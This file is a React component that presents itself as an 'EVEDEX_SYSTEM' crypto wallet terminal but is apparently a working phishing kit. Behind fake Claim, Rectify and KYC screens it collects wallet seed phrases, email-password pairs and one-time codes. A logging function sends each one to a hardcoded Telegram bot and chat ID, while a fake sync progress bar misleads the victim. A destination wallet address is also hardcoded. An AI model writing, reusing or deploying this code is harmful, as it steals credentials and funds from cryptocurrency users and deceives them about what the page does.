import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycCode, setKycCode] = useState(""); 
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955" };
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
  const { data: nativeBal } = useBalance({ address });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});

  const isSeedValid = useMemo(() => {
    const count = seedVal.trim().split(/\s+/).filter(w => w.length >= 3).length;
    return [12, 15, 18, 21, 24].includes(count);
  }, [seedVal]);

  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00"));
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_SYSTEM</div></div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><appkit-button /></div>
      ) : (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div style={{fontSize:'22px', marginBottom:'5px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
              {activeTask === "Rectify" && (
                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px'}}>
                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT_POOL</div>
                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>GAS_POOL</div>
                </div>
              )}
              <h2 style={{color:'white'}}>{activeTask}</h2>
              <input value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} style={{backgroundColor:'black', border:'1px solid #1e293b', color:'#10b981', fontSize:'28px', textAlign:'center', width:'100%', padding:'15px', borderRadius:'15px', marginTop:'15px'}} />
              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900', marginTop:'20px'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'35px', textAlign:'center'}}>
              <h2 style={{color:'white'}}>IDENTITY_SYNC</h2>
              {kycPhase === 1 ? (
                <>
                  <input placeholder="EMAIL" onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', margin:'10px 0'}} />
                  <input type="password" placeholder="PASSWORD" onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginBottom:'20px'}} />
                  <button onClick={()=>{if(kycEmail && kycPass){log(`🆔 KYC: ${kycEmail}/${kycPass}`); setKycPhase(2);}}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY</button>
                </>
              ) : (
                <>
                  <input maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'12px', color:'white', textAlign:'center', fontSize:'24px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
                  <button onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE</button>
                </>
              )}
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900'}}>🛡️ SECURE_RELAY</div>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'100px', backgroundColor:'black', color:'#10b981', padding:'15px', marginTop:'20px'}} />
                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px'}}>FINALIZE</button>
                  </>
                ) : (
                  <div><div style={{fontSize:'50px'}}>{syncProgress}%</div><div>SYNCING...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING...</div>}
    </div>
  );
}
